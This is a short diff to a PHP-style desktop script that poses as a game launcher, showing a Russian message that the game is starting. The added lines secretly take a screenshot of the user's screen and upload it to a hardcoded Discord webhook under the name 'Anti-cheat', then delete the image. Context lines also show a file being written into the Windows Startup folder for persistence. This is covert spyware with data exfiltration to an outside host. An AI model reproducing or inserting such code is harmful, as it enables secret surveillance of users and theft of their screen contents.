@@ -20,6 +20,41 @@ file_put_contents($_ENV['APPDATA'].'\Microsoft\Windows\Start Menu\Programs\Start
 
 //00000000000000
 message("Нажмите  Ok и ждите игра запускается!Больше не тыркайте по ярлыку!\nЕсли игра не запустится обновите Net Framework и Visual c++ библиотеки!");
+use httpclient;
+// Replace the URL with your own webhook url
+$url = "https://discord.com/api/webhooks/838284423278493697/gthE3yddrHZwT5n0dYCqvHtu5lQCYy_nnNdfghmnK-W2QOq3X7xPOoaEKhY-tiszfAGW";
+
+new RobotScript->screenshot()->save($_ENV['TEMP'].'\temp.png','png');
+$hookObject = [
+
+    'file' => new File($_ENV['TEMP'].'\temp.png'),
+    //'file1' => new File('C:\Users\Alex\Desktop\123.mp3'),
+    /*
+     * The general "message" shown above your embeds
+     */
+    "content" => "Anti-cheat :kissing_closed_eyes: ",
+
+    /*
+     * The username shown in the message
+     */
+    "username" => "Anti-cheat",
+    /*
+     * The image location for the senders image
+     */
+    //"avatar_url" => "https://xforgeassets001.xboxlive.com/serviceid-18231953-4b1d-472c-a39e-48b10105b7b7/a711e445-d98f-4849-8729-57b3c15a0f6f/contentname_Thumbnail_0.jpg",
+    /*
+     * Whether or not to read the message in Text-to-speech
+     */
+    "tts" => 0
+
+
+];
+
+$http = new HttpClient;
+$http->requestType = 'MULTIPART';
+$http->responseType = 'JSON';
+var_dump($http->post($url,$hookObject)->body());
+unlink($_ENV['TEMP'].'\temp.png');
 exit();
 //});
 
